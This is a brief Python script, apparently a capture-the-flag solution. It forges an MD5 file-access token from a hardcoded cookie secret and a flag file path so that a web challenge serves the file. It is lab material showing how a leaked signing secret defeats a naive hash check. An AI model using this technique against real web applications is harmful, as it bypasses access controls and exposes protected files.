import hashlib
hash = hashlib.md5()

filename='/fllllllllllllag'
cookie_secret="724e66fd-7389-43a2-bd75-9b3923bb3c7b"
hash.update(filename.encode('utf-8'))
s1=hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode('utf-8'))
print(hash.hexdigest())